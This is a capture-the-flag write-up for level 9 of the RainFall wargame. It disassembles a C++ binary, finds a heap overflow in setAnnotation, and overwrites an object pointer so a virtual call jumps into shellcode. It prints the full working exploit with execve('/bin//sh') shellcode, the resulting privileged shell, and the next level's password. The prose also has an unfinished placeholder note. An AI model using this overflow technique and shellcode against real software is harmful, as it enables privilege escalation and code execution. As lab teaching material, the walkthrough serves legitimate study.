# Level 9

Once logged in, you will see a binary `level9`.

```
[???]$ ssh localhost -p 4242 -l level9
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level9@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
level9@RainFall:~$
```

let's run the program
```
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 aaaaaaaaaaaa
level9@RainFall:~$ ./level9 aaaaaaaaaaaabbbbbbbbbbbbbbbb
level9@RainFall:~$
```

okay, this does nothing.

let's take into the binary

```
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
[...]
0x08049bb4  std::__ioinit
```

```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
[...]
0x080484d0  std::ios_base::Init::Init()
[...]
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
[...]
```

there is something unexpectied, looks like a C++ syntax is here

let's take a look at the main

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.
gdb-peda$
```

what in the world is the `_Znwj`?

```
level9@RainFall:~$ c++filt _Znwj
operator new(unsigned int)
```
it's a built c++ for new

and let's take a look at the functions again

```
Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
```

there is a `memcpy`, so we can use buffer overflow. First we need to find the offset

```

gdb-peda$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

[----------------------------------registers-----------------------------------]
EAX: 0x41366441 ('Ad6A')
EBX: 0x804a078 ("Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
ECX: 0x67413567 ('g5Ag')
EDX: 0x804a0d4 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xbffff618 --> 0x0
ESP: 0xbffff5f0 --> 0x804a008 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
EIP: 0x8048682 (<main+142>:	mov    edx,DWORD PTR [eax])
EFLAGS: 0x210287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
```

by using [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we can find out the offset is 108 (using eax)

In order to do that we must find the start address of our buffer and replace the value of esp+0x10 by it to make the call of edx calls our shellcode. But, because we need to dereference twice [XXX: Teo to add something about the gdb and dereferencing twice] like we want to access to the N class, our return address should points to an address which points to the start buffer XXXXXXXXXXXXXXXXXXXXXXXXXXXXX


after calling the setAnnotation(<_ZN1N13setAnnotationEPc>), the value of `[esp+0x10]` will be replaced with `0x804a00c`.

```
[----------------------------------registers-----------------------------------]
EAX: 0x804a00c ("BBBB")
EBX: 0x804a078 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
ECX: 0x42424242 ('BBBB')
EDX: 0x804a010 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xbffff6d8 --> 0x0
ESP: 0xbffff6b0 --> 0x804a008 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
EIP: 0x804867c (<main+136>:	mov    eax,DWORD PTR [esp+0x10])
EFLAGS: 0x200287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048670 <main+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x8048674 <main+128>:	mov    DWORD PTR [esp],eax
   0x8048677 <main+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
=> 0x804867c <main+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x8048680 <main+140>:	mov    eax,DWORD PTR [eax]
   0x8048682 <main+142>:	mov    edx,DWORD PTR [eax]
   0x8048684 <main+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x8048688 <main+148>:	mov    DWORD PTR [esp+0x4],eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff6b0 --> 0x804a008 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
0004| 0xbffff6b4 --> 0xbffff8c8 ("BBBB")
0008| 0xbffff6b8 --> 0xbffff780 --> 0xbffff8cd ("SHELL=/bin/bash")
0012| 0xbffff6bc --> 0xb7d79e55 (<__cxa_atexit+53>:	add    esp,0x18)
0016| 0xbffff6c0 --> 0x804a078 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
0020| 0xbffff6c4 --> 0x804a008 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
0024| 0xbffff6c8 --> 0x804a078 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
0028| 0xbffff6cc --> 0x804a008 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804867c in main ()
gdb-peda$
```
Because we need to dereference again, the address needs to be changed to the beginning of the shell code (+4 bytes), which is `0x804a010`

so the payload will need to set as below:

```
[               total of 108 bytes                ] + [ 4 bytes ]
address beginnig of shellcode + shellcode + padding + buffer_addr
[0x804a010] + [\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80] + [random character with 76 bytes] + [0x804a00c]
```

now let's run the program with exploit

```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
